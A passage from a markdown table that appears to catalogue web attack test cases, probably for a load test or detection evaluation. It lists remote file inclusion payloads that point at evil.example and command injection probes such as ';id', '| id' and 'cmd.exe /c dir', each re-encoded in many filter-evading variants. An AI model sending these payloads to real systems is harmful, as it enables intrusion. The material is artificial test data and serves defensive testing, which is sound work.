| ` rfi/variant-03170 ` | ` rfi/syntax-0086 ` | ` json-unicode-strings ` | POST | ` /api/loadtest/rfi ` | ` {"\u0069\u006e\u0070\u0075\u0074":"\u0068\u0074\u0074\u0070\u0073\u003a\u002f\u002f\u0065\u0076\u0069\u006c\u002e\u0065\u0078\u0061\u006d\u0070\u006c\u0065\u002f\u006c\u006f\u0061\u0064\u0074\u0065\u0073\u0074\u002e\u0074\u0078\u0074"} ` | 97 |
| ` rfi/variant-03171 ` | ` rfi/syntax-0086 ` | ` json-layout-20 ` | POST | ` /api/loadtest/rfi ` | ` {\n "input": "https://evil.example/loadtest.txt"\n} ` | 97 |
| ` rfi/variant-03172 ` | ` rfi/syntax-0086 ` | ` json-layout-09 ` | POST | ` /api/loadtest/rfi ` | ` {\n\t"input": "https://evil.example/loadtest.txt"\n} ` | 97 |
| ` rfi/variant-03173 ` | ` rfi/syntax-0087 ` | ` query-encoded-name ` | GET | ` /api/loadtest/rfi?%69%6E%70%75%74=ftp%3A%2F%2Fevil.example%2Floadtest.php ` | (empty) | 97 |
| ` rfi/variant-03174 ` | ` rfi/syntax-0087 ` | ` query-encoded-value ` | GET | ` /api/loadtest/rfi?input=%66%74%70%3A%2F%2F%65%76%69%6C%2E%65%78%61%6D%70%6C%65%2F%6C%6F%61%64%74%65%73%74%2E%70%68%70 ` | (empty) | 97 |
| ` rfi/variant-03175 ` | ` rfi/syntax-0087 ` | ` query-encoded-both ` | GET | ` /api/loadtest/rfi?%69%6E%70%75%74=%66%74%70%3A%2F%2F%65%76%69%6C%2E%65%78%61%6D%70%6C%65%2F%6C%6F%61%64%74%65%73%74%2E%70%68%70 ` | (empty) | 97 |
| ` rfi/variant-03176 ` | ` rfi/syntax-0087 ` | ` query-lower-hex ` | GET | ` /api/loadtest/rfi?%69%6e%70%75%74=%66%74%70%3a%2f%2f%65%76%69%6c%2e%65%78%61%6d%70%6c%65%2f%6c%6f%61%64%74%65%73%74%2e%70%68%70 ` | (empty) | 97 |
| ` rfi/variant-03177 ` | ` rfi/syntax-0088 ` | ` form-encoded-name ` | POST | ` /api/loadtest/rfi ` | ` %69%6E%70%75%74=ftp%3A%2F%2Fevil.example%2Floadtest.php ` | 97 |
| ` rfi/variant-03178 ` | ` rfi/syntax-0088 ` | ` form-encoded-value ` | POST | ` /api/loadtest/rfi ` | ` input=%66%74%70%3A%2F%2F%65%76%69%6C%2E%65%78%61%6D%70%6C%65%2F%6C%6F%61%64%74%65%73%74%2E%70%68%70 ` | 97 |
| ` rfi/variant-03179 ` | ` rfi/syntax-0088 ` | ` form-encoded-both ` | POST | ` /api/loadtest/rfi ` | ` %69%6E%70%75%74=%66%74%70%3A%2F%2F%65%76%69%6C%2E%65%78%61%6D%70%6C%65%2F%6C%6F%61%64%74%65%73%74%2E%70%68%70 ` | 97 |
| ` rfi/variant-03180 ` | ` rfi/syntax-0088 ` | ` form-lower-hex ` | POST | ` /api/loadtest/rfi ` | ` %69%6e%70%75%74=%66%74%70%3a%2f%2f%65%76%69%6c%2e%65%78%61%6d%70%6c%65%2f%6c%6f%61%64%74%65%73%74%2e%70%68%70 ` | 97 |
| ` rfi/variant-03181 ` | ` rfi/syntax-0089 ` | ` json-unicode-strings ` | POST | ` /api/loadtest/rfi ` | ` {"\u0069\u006e\u0070\u0075\u0074":"\u0066\u0074\u0070\u003a\u002f\u002f\u0065\u0076\u0069\u006c\u002e\u0065\u0078\u0061\u006d\u0070\u006c\u0065\u002f\u006c\u006f\u0061\u0064\u0074\u0065\u0073\u0074\u002e\u0070\u0068\u0070"} ` | 97 |
| ` rfi/variant-03182 ` | ` rfi/syntax-0089 ` | ` json-layout-20 ` | POST | ` /api/loadtest/rfi ` | ` {\n "input": "ftp://evil.example/loadtest.php"\n} ` | 97 |
| ` rfi/variant-03183 ` | ` rfi/syntax-0089 ` | ` json-layout-09 ` | POST | ` /api/loadtest/rfi ` | ` {\n\t"input": "ftp://evil.example/loadtest.php"\n} ` | 97 |
| ` rfi/variant-03184 ` | ` rfi/syntax-0090 ` | ` query-encoded-name ` | GET | ` /api/loadtest/rfi?%69%6E%70%75%74=%2F%2Fevil.example%2Floadtest.php ` | (empty) | 97 |
| ` rfi/variant-03185 ` | ` rfi/syntax-0090 ` | ` query-encoded-value ` | GET | ` /api/loadtest/rfi?input=%2F%2F%65%76%69%6C%2E%65%78%61%6D%70%6C%65%2F%6C%6F%61%64%74%65%73%74%2E%70%68%70 ` | (empty) | 97 |
| ` rfi/variant-03186 ` | ` rfi/syntax-0090 ` | ` query-encoded-both ` | GET | ` /api/loadtest/rfi?%69%6E%70%75%74=%2F%2F%65%76%69%6C%2E%65%78%61%6D%70%6C%65%2F%6C%6F%61%64%74%65%73%74%2E%70%68%70 ` | (empty) | 97 |
| ` rfi/variant-03187 ` | ` rfi/syntax-0090 ` | ` query-lower-hex ` | GET | ` /api/loadtest/rfi?%69%6e%70%75%74=%2f%2f%65%76%69%6c%2e%65%78%61%6d%70%6c%65%2f%6c%6f%61%64%74%65%73%74%2e%70%68%70 ` | (empty) | 97 |
| ` rfi/variant-03188 ` | ` rfi/syntax-0091 ` | ` form-encoded-name ` | POST | ` /api/loadtest/rfi ` | ` %69%6E%70%75%74=%2F%2Fevil.example%2Floadtest.php ` | 97 |
| ` rfi/variant-03189 ` | ` rfi/syntax-0091 ` | ` form-encoded-value ` | POST | ` /api/loadtest/rfi ` | ` input=%2F%2F%65%76%69%6C%2E%65%78%61%6D%70%6C%65%2F%6C%6F%61%64%74%65%73%74%2E%70%68%70 ` | 97 |
| ` rfi/variant-03190 ` | ` rfi/syntax-0091 ` | ` form-encoded-both ` | POST | ` /api/loadtest/rfi ` | ` %69%6E%70%75%74=%2F%2F%65%76%69%6C%2E%65%78%61%6D%70%6C%65%2F%6C%6F%61%64%74%65%73%74%2E%70%68%70 ` | 97 |
| ` rfi/variant-03191 ` | ` rfi/syntax-0091 ` | ` form-lower-hex ` | POST | ` /api/loadtest/rfi ` | ` %69%6e%70%75%74=%2f%2f%65%76%69%6c%2e%65%78%61%6d%70%6c%65%2f%6c%6f%61%64%74%65%73%74%2e%70%68%70 ` | 97 |
| ` rfi/variant-03192 ` | ` rfi/syntax-0092 ` | ` json-unicode-strings ` | POST | ` /api/loadtest/rfi ` | ` {"\u0069\u006e\u0070\u0075\u0074":"\u002f\u002f\u0065\u0076\u0069\u006c\u002e\u0065\u0078\u0061\u006d\u0070\u006c\u0065\u002f\u006c\u006f\u0061\u0064\u0074\u0065\u0073\u0074\u002e\u0070\u0068\u0070"} ` | 97 |
| ` rfi/variant-03193 ` | ` rfi/syntax-0092 ` | ` json-layout-20 ` | POST | ` /api/loadtest/rfi ` | ` {\n "input": "//evil.example/loadtest.php"\n} ` | 97 |
| ` rfi/variant-03194 ` | ` rfi/syntax-0092 ` | ` json-layout-09 ` | POST | ` /api/loadtest/rfi ` | ` {\n\t"input": "//evil.example/loadtest.php"\n} ` | 97 |
| ` rfi/variant-03195 ` | ` rfi/syntax-0093 ` | ` query-encoded-name ` | GET | ` /api/loadtest/rfi?%69%6E%70%75%74=http%3A%2F%2Fevil.example%3A8080%2Floadtest.php ` | (empty) | 97 |
| ` rfi/variant-03196 ` | ` rfi/syntax-0093 ` | ` query-encoded-value ` | GET | ` /api/loadtest/rfi?input=%68%74%74%70%3A%2F%2F%65%76%69%6C%2E%65%78%61%6D%70%6C%65%3A%38%30%38%30%2F%6C%6F%61%64%74%65%73%74%2E%70%68%70 ` | (empty) | 97 |
| ` rfi/variant-03197 ` | ` rfi/syntax-0093 ` | ` query-encoded-both ` | GET | ` /api/loadtest/rfi?%69%6E%70%75%74=%68%74%74%70%3A%2F%2F%65%76%69%6C%2E%65%78%61%6D%70%6C%65%3A%38%30%38%30%2F%6C%6F%61%64%74%65%73%74%2E%70%68%70 ` | (empty) | 97 |
| ` rfi/variant-03198 ` | ` rfi/syntax-0093 ` | ` query-lower-hex ` | GET | ` /api/loadtest/rfi?%69%6e%70%75%74=%68%74%74%70%3a%2f%2f%65%76%69%6c%2e%65%78%61%6d%70%6c%65%3a%38%30%38%30%2f%6c%6f%61%64%74%65%73%74%2e%70%68%70 ` | (empty) | 97 |
| ` rfi/variant-03199 ` | ` rfi/syntax-0094 ` | ` form-encoded-name ` | POST | ` /api/loadtest/rfi ` | ` %69%6E%70%75%74=http%3A%2F%2Fevil.example%3A8080%2Floadtest.php ` | 97 |
| ` rfi/variant-03200 ` | ` rfi/syntax-0094 ` | ` form-encoded-value ` | POST | ` /api/loadtest/rfi ` | ` input=%68%74%74%70%3A%2F%2F%65%76%69%6C%2E%65%78%61%6D%70%6C%65%3A%38%30%38%30%2F%6C%6F%61%64%74%65%73%74%2E%70%68%70 ` | 97 |
| ` rfi/variant-03201 ` | ` rfi/syntax-0094 ` | ` form-encoded-both ` | POST | ` /api/loadtest/rfi ` | ` %69%6E%70%75%74=%68%74%74%70%3A%2F%2F%65%76%69%6C%2E%65%78%61%6D%70%6C%65%3A%38%30%38%30%2F%6C%6F%61%64%74%65%73%74%2E%70%68%70 ` | 97 |
| ` rfi/variant-03202 ` | ` rfi/syntax-0094 ` | ` form-lower-hex ` | POST | ` /api/loadtest/rfi ` | ` %69%6e%70%75%74=%68%74%74%70%3a%2f%2f%65%76%69%6c%2e%65%78%61%6d%70%6c%65%3a%38%30%38%30%2f%6c%6f%61%64%74%65%73%74%2e%70%68%70 ` | 97 |
| ` rfi/variant-03203 ` | ` rfi/syntax-0095 ` | ` json-unicode-strings ` | POST | ` /api/loadtest/rfi ` | ` {"\u0069\u006e\u0070\u0075\u0074":"\u0068\u0074\u0074\u0070\u003a\u002f\u002f\u0065\u0076\u0069\u006c\u002e\u0065\u0078\u0061\u006d\u0070\u006c\u0065\u003a\u0038\u0030\u0038\u0030\u002f\u006c\u006f\u0061\u0064\u0074\u0065\u0073\u0074\u002e\u0070\u0068\u0070"} ` | 97 |
| ` rfi/variant-03204 ` | ` rfi/syntax-0095 ` | ` json-layout-20 ` | POST | ` /api/loadtest/rfi ` | ` {\n "input": "http://evil.example:8080/loadtest.php"\n} ` | 97 |
| ` rfi/variant-03205 ` | ` rfi/syntax-0095 ` | ` json-layout-09 ` | POST | ` /api/loadtest/rfi ` | ` {\n\t"input": "http://evil.example:8080/loadtest.php"\n} ` | 97 |
| ` rfi/variant-03206 ` | ` rfi/syntax-0096 ` | ` query-encoded-name ` | GET | ` /api/loadtest/rfi?%69%6E%70%75%74=https%3A%2F%2Fevil.example%2Floadtest.php%3Fx%3D1 ` | (empty) | 97 |
| ` rfi/variant-03207 ` | ` rfi/syntax-0096 ` | ` query-encoded-value ` | GET | ` /api/loadtest/rfi?input=%68%74%74%70%73%3A%2F%2F%65%76%69%6C%2E%65%78%61%6D%70%6C%65%2F%6C%6F%61%64%74%65%73%74%2E%70%68%70%3F%78%3D%31 ` | (empty) | 97 |
| ` rfi/variant-03208 ` | ` rfi/syntax-0096 ` | ` query-encoded-both ` | GET | ` /api/loadtest/rfi?%69%6E%70%75%74=%68%74%74%70%73%3A%2F%2F%65%76%69%6C%2E%65%78%61%6D%70%6C%65%2F%6C%6F%61%64%74%65%73%74%2E%70%68%70%3F%78%3D%31 ` | (empty) | 97 |
| ` rfi/variant-03209 ` | ` rfi/syntax-0096 ` | ` query-lower-hex ` | GET | ` /api/loadtest/rfi?%69%6e%70%75%74=%68%74%74%70%73%3a%2f%2f%65%76%69%6c%2e%65%78%61%6d%70%6c%65%2f%6c%6f%61%64%74%65%73%74%2e%70%68%70%3f%78%3d%31 ` | (empty) | 97 |
| ` rfi/variant-03210 ` | ` rfi/syntax-0097 ` | ` form-encoded-name ` | POST | ` /api/loadtest/rfi ` | ` %69%6E%70%75%74=https%3A%2F%2Fevil.example%2Floadtest.php%3Fx%3D1 ` | 97 |
| ` rfi/variant-03211 ` | ` rfi/syntax-0097 ` | ` form-encoded-value ` | POST | ` /api/loadtest/rfi ` | ` input=%68%74%74%70%73%3A%2F%2F%65%76%69%6C%2E%65%78%61%6D%70%6C%65%2F%6C%6F%61%64%74%65%73%74%2E%70%68%70%3F%78%3D%31 ` | 97 |
| ` rfi/variant-03212 ` | ` rfi/syntax-0097 ` | ` form-encoded-both ` | POST | ` /api/loadtest/rfi ` | ` %69%6E%70%75%74=%68%74%74%70%73%3A%2F%2F%65%76%69%6C%2E%65%78%61%6D%70%6C%65%2F%6C%6F%61%64%74%65%73%74%2E%70%68%70%3F%78%3D%31 ` | 97 |
| ` rfi/variant-03213 ` | ` rfi/syntax-0097 ` | ` form-lower-hex ` | POST | ` /api/loadtest/rfi ` | ` %69%6e%70%75%74=%68%74%74%70%73%3a%2f%2f%65%76%69%6c%2e%65%78%61%6d%70%6c%65%2f%6c%6f%61%64%74%65%73%74%2e%70%68%70%3f%78%3d%31 ` | 97 |
| ` rfi/variant-03214 ` | ` rfi/syntax-0098 ` | ` json-unicode-strings ` | POST | ` /api/loadtest/rfi ` | ` {"\u0069\u006e\u0070\u0075\u0074":"\u0068\u0074\u0074\u0070\u0073\u003a\u002f\u002f\u0065\u0076\u0069\u006c\u002e\u0065\u0078\u0061\u006d\u0070\u006c\u0065\u002f\u006c\u006f\u0061\u0064\u0074\u0065\u0073\u0074\u002e\u0070\u0068\u0070\u003f\u0078\u003d\u0031"} ` | 97 |
| ` rfi/variant-03215 ` | ` rfi/syntax-0098 ` | ` json-layout-20 ` | POST | ` /api/loadtest/rfi ` | ` {\n "input": "https://evil.example/loadtest.php?x=1"\n} ` | 97 |
| ` rfi/variant-03216 ` | ` rfi/syntax-0098 ` | ` json-layout-09 ` | POST | ` /api/loadtest/rfi ` | ` {\n\t"input": "https://evil.example/loadtest.php?x=1"\n} ` | 97 |

## Command injection

| Case | Parent | Variation | Method | Wire target | Body or relevant header | Origin requests |
| --- | --- | --- | --- | --- | --- | ---: |
| ` rce/93 ` | (original) | (original) | GET | ` /?x=%60id%60 ` | (empty) | 98 |
| ` rce/97 ` | (original) | (original) | GET | ` /?x=%0aid ` | (empty) | 98 |
| ` rce/99 ` | (original) | (original) | GET | ` /?run=cmd.exe%20/c%20dir ` | (empty) | 98 |
| ` rce/syntax-0101 ` | ` rce/syntax-family ` | ` syntax-00-query ` | GET | ` /api/loadtest/rce?input=%3Bid ` | (empty) | 98 |
| ` rce/syntax-0102 ` | ` rce/syntax-family ` | ` syntax-00-form ` | POST | ` /api/loadtest/rce ` | ` input=%3Bid ` | 98 |
| ` rce/syntax-0103 ` | ` rce/syntax-family ` | ` syntax-00-json ` | POST | ` /api/loadtest/rce ` | ` {"input":";id"} ` | 98 |
| ` rce/syntax-0104 ` | ` rce/syntax-family ` | ` syntax-01-query ` | GET | ` /api/loadtest/rce?input=%26%26+id ` | (empty) | 98 |
| ` rce/syntax-0105 ` | ` rce/syntax-family ` | ` syntax-01-form ` | POST | ` /api/loadtest/rce ` | ` input=%26%26+id ` | 98 |
| ` rce/syntax-0106 ` | ` rce/syntax-family ` | ` syntax-01-json ` | POST | ` /api/loadtest/rce ` | ` {"input":"\u0026\u0026 id"} ` | 98 |
| ` rce/syntax-0107 ` | ` rce/syntax-family ` | ` syntax-02-query ` | GET | ` /api/loadtest/rce?input=%7C+id ` | (empty) | 98 |
| ` rce/syntax-0108 ` | ` rce/syntax-family ` | ` syntax-02-form ` | POST | ` /api/loadtest/rce ` | ` input=%7C+id ` | 98 |
| ` rce/syntax-0109 ` | ` rce/syntax-family ` | ` syntax-02-json ` | POST | ` /api/loadtest/rce ` | ` {"input":"\| id"} ` | 98 |
| ` rce/syntax-0113 ` | ` rce/syntax-family ` | ` syntax-04-query ` | GET | ` /api/loadtest/rce?input=%3B+i%27%27d ` | (empty) | 98 |
| ` rce/syntax-0114 ` | ` rce/syntax-family ` | ` syntax-04-form ` | POST | ` /api/loadtest/rce ` | ` input=%3B+i%27%27d ` | 98 |
| ` rce/syntax-0115 ` | ` rce/syntax-family ` | ` syntax-04-json ` | POST | ` /api/loadtest/rce ` | ` {"input":"; i''d"} ` | 98 |
| ` rce/syntax-0122 ` | ` rce/syntax-family ` | ` syntax-07-query ` | GET | ` /api/loadtest/rce?input=cmd.exe+%2Fc+echo+LOADTEST ` | (empty) | 98 |
| ` rce/syntax-0123 ` | ` rce/syntax-family ` | ` syntax-07-form ` | POST | ` /api/loadtest/rce ` | ` input=cmd.exe+%2Fc+echo+LOADTEST ` | 98 |
| ` rce/syntax-0124 ` | ` rce/syntax-family ` | ` syntax-07-json ` | POST | ` /api/loadtest/rce ` | ` {"input":"cmd.exe /c echo LOADTEST"} ` | 98 |
| ` rce/variant-01462 ` | ` rce/93 ` | ` query-encoded-name ` | GET | ` /?%78=%60id%60 ` | (empty) | 98 |
| ` rce/variant-01463 ` | ` rce/93 ` | ` query-encoded-value ` | GET | ` /?x=%60%69%64%60 ` | (empty) | 98 |
| ` rce/variant-01464 ` | ` rce/93 ` | ` query-encoded-both ` | GET | ` /?%78=%60%69%64%60 ` | (empty) | 98 |
| ` rce/variant-01477 ` | ` rce/97 ` | ` query-encoded-name ` | GET | ` /?%78=%0aid ` | (empty) | 98 |
| ` rce/variant-01478 ` | ` rce/97 ` | ` query-encoded-value ` | GET | ` /?x=%0A%69%64 ` | (empty) | 98 |
| ` rce/variant-01479 ` | ` rce/97 ` | ` query-encoded-both ` | GET | ` /?%78=%0A%69%64 ` | (empty) | 98 |
| ` rce/variant-01480 ` | ` rce/97 ` | ` query-lower-hex ` | GET | ` /?%78=%0a%69%64 ` | (empty) | 98 |
| ` rce/variant-01481 ` | ` rce/97 ` | ` query-percent-space ` | GET | ` /?x=%0Aid ` | (empty) | 98 |
| ` rce/variant-01487 ` | ` rce/99 ` | ` query-encoded-name ` | GET | ` /?%72%75%6E=cmd.exe%20/c%20dir ` | (empty) | 98 |
| ` rce/variant-01488 ` | ` rce/99 ` | ` query-encoded-value ` | GET | ` /?run=%63%6D%64%2E%65%78%65%20%2F%63%20%64%69%72 ` | (empty) | 98 |
| ` rce/variant-01489 ` | ` rce/99 ` | ` query-encoded-both ` | GET | ` /?%72%75%6E=%63%6D%64%2E%65%78%65%20%2F%63%20%64%69%72 ` | (empty) | 98 |
| ` rce/variant-01490 ` | ` rce/99 ` | ` query-lower-hex ` | GET | ` /?%72%75%6e=%63%6d%64%2e%65%78%65%20%2f%63%20%64%69%72 ` | (empty) | 98 |
| ` rce/variant-01491 ` | ` rce/99 ` | ` query-percent-space ` | GET | ` /?run=cmd.exe%20%2Fc%20dir ` | (empty) | 98 |
| ` rce/variant-01492 ` | ` rce/99 ` | ` query-plus-space ` | GET | ` /?run=cmd.exe+%2Fc+dir ` | (empty) | 98 |
| ` rce/variant-03225 ` | ` rce/syntax-0101 ` | ` query-encoded-name ` | GET | ` /api/loadtest/rce?%69%6E%70%75%74=%3Bid ` | (empty) | 97 |
| ` rce/variant-03226 ` | ` rce/syntax-0101 ` | ` query-encoded-value ` | GET | ` /api/loadtest/rce?input=%3B%69%64 ` | (empty) | 97 |
| ` rce/variant-03227 ` | ` rce/syntax-0101 ` | ` query-encoded-both ` | GET | ` /api/loadtest/rce?%69%6E%70%75%74=%3B%69%64 ` | (empty) | 97 |
| ` rce/variant-03228 ` | ` rce/syntax-0101 ` | ` query-lower-hex ` | GET | ` /api/loadtest/rce?%69%6e%70%75%74=%3b%69%64 ` | (empty) | 97 |
| ` rce/variant-03229 ` | ` rce/syntax-0102 ` | ` form-encoded-name ` | POST | ` /api/loadtest/rce ` | ` %69%6E%70%75%74=%3Bid ` | 97 |
| ` rce/variant-03230 ` | ` rce/syntax-0102 ` | ` form-encoded-value ` | POST | ` /api/loadtest/rce ` | ` input=%3B%69%64 ` | 97 |
| ` rce/variant-03231 ` | ` rce/syntax-0102 ` | ` form-encoded-both ` | POST | ` /api/loadtest/rce ` | ` %69%6E%70%75%74=%3B%69%64 ` | 97 |
| ` rce/variant-03232 ` | ` rce/syntax-0102 ` | ` form-lower-hex ` | POST | ` /api/loadtest/rce ` | ` %69%6e%70%75%74=%3b%69%64 ` | 97 |
| ` rce/variant-03233 ` | ` rce/syntax-0103 ` | ` json-unicode-strings ` | POST | ` /api/loadtest/rce ` | ` {"\u0069\u006e\u0070\u0075\u0074":"\u003b\u0069\u0064"} ` | 97 |
| ` rce/variant-03234 ` | ` rce/syntax-0103 ` | ` json-layout-20 ` | POST | ` /api/loadtest/rce ` | ` {\n "input": ";id"\n} ` | 97 |
| ` rce/variant-03235 ` | ` rce/syntax-0103 ` | ` json-layout-09 ` | POST | ` /api/loadtest/rce ` | ` {\n\t"input": ";id"\n} ` | 97 |
| ` rce/variant-03236 ` | ` rce/syntax-0104 ` | ` query-encoded-name ` | GET | ` /api/loadtest/rce?%69%6E%70%75%74=%26%26+id ` | (empty) | 97 |
| ` rce/variant-03237 ` | ` rce/syntax-0104 ` | ` query-encoded-value ` | GET | ` /api/loadtest/rce?input=%26%26%20%69%64 ` | (empty) | 97 |
| ` rce/variant-03238 ` | ` rce/syntax-0104 ` | ` query-encoded-both ` | GET | ` /api/loadtest/rce?%69%6E%70%75%74=%26%26%20%69%64 ` | (empty) | 97 |
| ` rce/variant-03239 ` | ` rce/syntax-0104 ` | ` query-lower-hex ` | GET | ` /api/loadtest/rce?%69%6e%70%75%74=%26%26%20%69%64 ` | (empty) | 97 |
| ` rce/variant-03240 ` | ` rce/syntax-0104 ` | ` query-percent-space ` | GET | ` /api/loadtest/rce?input=%26%26%20id ` | (empty) | 97 |
| ` rce/variant-03241 ` | ` rce/syntax-0105 ` | ` form-encoded-name ` | POST | ` /api/loadtest/rce ` | ` %69%6E%70%75%74=%26%26+id ` | 97 |
| ` rce/variant-03242 ` | ` rce/syntax-0105 ` | ` form-encoded-value ` | POST | ` /api/loadtest/rce ` | ` input=%26%26%20%69%64 ` | 97 |
| ` rce/variant-03243 ` | ` rce/syntax-0105 ` | ` form-encoded-both ` | POST | ` /api/loadtest/rce ` | ` %69%6E%70%75%74=%26%26%20%69%64 ` | 97 |
| ` rce/variant-03244 ` | ` rce/syntax-0105 ` | ` form-lower-hex ` | POST | ` /api/loadtest/rce ` | ` %69%6e%70%75%74=%26%26%20%69%64 ` | 97 |
| ` rce/variant-03245 ` | ` rce/syntax-0105 ` | ` form-percent-space ` | POST | ` /api/loadtest/rce ` | ` input=%26%26%20id ` | 97 |
| ` rce/variant-03246 ` | ` rce/syntax-0106 ` | ` json-unicode-strings ` | POST | ` /api/loadtest/rce ` | ` {"\u0069\u006e\u0070\u0075\u0074":"\u0026\u0026\u0020\u0069\u0064"} ` | 97 |
| ` rce/variant-03247 ` | ` rce/syntax-0106 ` | ` json-layout-20 ` | POST | ` /api/loadtest/rce ` | ` {\n "input": "\u0026\u0026 id"\n} ` | 97 |
| ` rce/variant-03248 ` | ` rce/syntax-0106 ` | ` json-layout-09 ` | POST | ` /api/loadtest/rce ` | ` {\n\t"input": "\u0026\u0026 id"\n} ` | 97 |
| ` rce/variant-03249 ` | ` rce/syntax-0107 ` | ` query-encoded-name ` | GET | ` /api/loadtest/rce?%69%6E%70%75%74=%7C+id ` | (empty) | 97 |
| ` rce/variant-03250 ` | ` rce/syntax-0107 ` | ` query-encoded-value ` | GET | ` /api/loadtest/rce?input=%7C%20%69%64 ` | (empty) | 97 |
| ` rce/variant-03251 ` | ` rce/syntax-0107 ` | ` query-encoded-both ` | GET | ` /api/loadtest/rce?%69%6E%70%75%74=%7C%20%69%64 ` | (empty) | 97 |
| ` rce/variant-03252 ` | ` rce/syntax-0107 ` | ` query-lower-hex ` | GET | ` /api/loadtest/rce?%69%6e%70%75%74=%7c%20%69%64 ` | (empty) | 97 |
| ` rce/variant-03253 ` | ` rce/syntax-0107 ` | ` query-percent-space ` | GET | ` /api/loadtest/rce?input=%7C%20id ` | (empty) | 97 |
| ` rce/variant-03254 ` | ` rce/syntax-0108 ` | ` form-encoded-name ` | POST | ` /api/loadtest/rce ` | ` %69%6E%70%75%74=%7C+id ` | 97 |
| ` rce/variant-03255 ` | ` rce/syntax-0108 ` | ` form-encoded-value ` | POST | ` /api/loadtest/rce ` | ` input=%7C%20%69%64 ` | 97 |
| ` rce/variant-03256 ` | ` rce/syntax-0108 ` | ` form-encoded-both ` | POST | ` /api/loadtest/rce ` | ` %69%6E%70%75%74=%7C%20%69%64 ` | 97 |
| ` rce/variant-03257 ` | ` rce/syntax-0108 ` | ` form-lower-hex ` | POST | ` /api/loadtest/rce ` | ` %69%6e%70%75%74=%7c%20%69%64 ` | 97 |
| ` rce/variant-03258 ` | ` rce/syntax-0108 ` | ` form-percent-space ` | POST | ` /api/loadtest/rce ` | ` input=%7C%20id ` | 97 |
| ` rce/variant-03259 ` | ` rce/syntax-0109 ` | ` json-unicode-strings ` | POST | ` /api/loadtest/rce ` | ` {"\u0069\u006e\u0070\u0075\u0074":"\u007c\u0020\u0069\u0064"} ` | 97 |
| ` rce/variant-03260 ` | ` rce/syntax-0109 ` | ` json-layout-20 ` | POST | ` /api/loadtest/rce ` | ` {\n "input": "\| id"\n} ` | 97 |
| ` rce/variant-03261 ` | ` rce/syntax-0109 ` | ` json-layout-09 ` | POST | ` /api/loadtest/rce ` | ` {\n\t"input": "\| id"\n} ` | 97 |
| ` rce/variant-03273 ` | ` rce/syntax-0113 ` | ` query-encoded-name ` | GET | ` /api/loadtest/rce?%69%6E%70%75%74=%3B+i%27%27d ` | (empty) | 97 |
| ` rce/variant-03274 ` | ` rce/syntax-0113 ` | ` query-encoded-value ` | GET | ` /api/loadtest/rce?input=%3B%20%69%27%27%64 ` | (empty) | 97 |
| ` rce/variant-03275 ` | ` rce/syntax-0113 ` | ` query-encoded-both ` | GET | ` /api/loadtest/rce?%69%6E%70%75%74=%3B%20%69%27%27%64 ` | (empty) | 97 |
| ` rce/variant-03276 ` | ` rce/syntax-0113 ` | ` query-lower-hex ` | GET | ` /api/loadtest/rce?%69%6e%70%75%74=%3b%20%69%27%27%64 ` | (empty) | 97 |
| ` rce/variant-03277 ` | ` rce/syntax-0113 ` | ` query-percent-space ` | GET | ` /api/loadtest/rce?input=%3B%20i%27%27d ` | (empty) | 97 |
| ` rce/variant-03278 ` | ` rce/syntax-0114 ` | ` form-encoded-name ` | POST | ` /api/loadtest/rce ` | ` %69%6E%70%75%74=%3B+i%27%27d ` | 97 |
| ` rce/variant-03279 ` | ` rce/syntax-0114 ` | ` form-encoded-value ` | POST | ` /api/loadtest/rce ` | ` input=%3B%20%69%27%27%64 ` | 97 |
| ` rce/variant-03280 ` | ` rce/syntax-0114 ` | ` form-encoded-both ` | POST | ` /api/loadtest/rce ` | ` %69%6E%70%75%74=%3B%20%69%27%27%64 ` | 97 |
| ` rce/variant-03281 ` | ` rce/syntax-0114 ` | ` form-lower-hex ` | POST | ` /api/loadtest/rce ` | ` %69%6e%70%75%74=%3b%20%69%27%27%64 ` | 97 |
| ` rce/variant-03282 ` | ` rce/syntax-0114 ` | ` form-percent-space ` | POST | ` /api/loadtest/rce ` | ` input=%3B%20i%27%27d ` | 97 |
| ` rce/variant-03283 ` | ` rce/syntax-0115 ` | ` json-unicode-strings ` | POST | ` /api/loadtest/rce ` | ` {"\u0069\u006e\u0070\u0075\u0074":"\u003b\u0020\u0069\u0027\u0027\u0064"} ` | 97 |
| ` rce/variant-03284 ` | ` rce/syntax-0115 ` | ` json-layout-20 ` | POST | ` /api/loadtest/rce ` | ` {\n "input": "; i''d"\n} ` | 97 |
| ` rce/variant-03285 ` | ` rce/syntax-0115 ` | ` json-layout-09 ` | POST | ` /api/loadtest/rce ` | ` {\n\t"input": "; i''d"\n} ` | 97 |
| ` rce/variant-03312 ` | ` rce/syntax-0122 ` | ` query-encoded-name ` | GET | ` /api/loadtest/rce?%69%6E%70%75%74=cmd.exe+%2Fc+echo+LOADTEST ` | (empty) | 97 |
| ` rce/variant-03313 ` | ` rce/syntax-0122 ` | ` query-encoded-value ` | GET | ` /api/loadtest/rce?input=%63%6D%64%2E%65%78%65%20%2F%63%20%65%63%68%6F%20%4C%4F%41%44%54%45%53%54 ` | (empty) | 97 |
| ` rce/variant-03314 ` | ` rce/syntax-0122 ` | ` query-encoded-both ` | GET | ` /api/loadtest/rce?%69%6E%70%75%74=%63%6D%64%2E%65%78%65%20%2F%63%20%65%63%68%6F%20%4C%4F%41%44%54%45%53%54 ` | (empty) | 97 |
| ` rce/variant-03315 ` | ` rce/syntax-0122 ` | ` query-lower-hex ` | GET | ` /api/loadtest/rce?%69%6e%70%75%74=%63%6d%64%2e%65%78%65%20%2f%63%20%65%63%68%6f%20%4c%4f%41%44%54%45%53%54 ` | (empty) | 97 |
| ` rce/variant-03316 ` | ` rce/syntax-0122 ` | ` query-percent-space ` | GET | ` /api/loadtest/rce?input=cmd.exe%20%2Fc%20echo%20LOADTEST ` | (empty) | 97 |
| ` rce/variant-03317 ` | ` rce/syntax-0123 ` | ` form-encoded-name ` | POST | ` /api/loadtest/rce ` | ` %69%6E%70%75%74=cmd.exe+%2Fc+echo+LOADTEST ` | 97 |
| ` rce/variant-03318 ` | ` rce/syntax-0123 ` | ` form-encoded-value ` | POST | ` /api/loadtest/rce ` | ` input=%63%6D%64%2E%65%78%65%20%2F%63%20%65%63%68%6F%20%4C%4F%41%44%54%45%53%54 ` | 97 |
| ` rce/variant-03319 ` | ` rce/syntax-0123 ` | ` form-encoded-both ` | POST | ` /api/loadtest/rce ` | ` %69%6E%70%75%74=%63%6D%64%2E%65%78%65%20%2F%63%20%65%63%68%6F%20%4C%4F%41%44%54%45%53%54 ` | 97 |
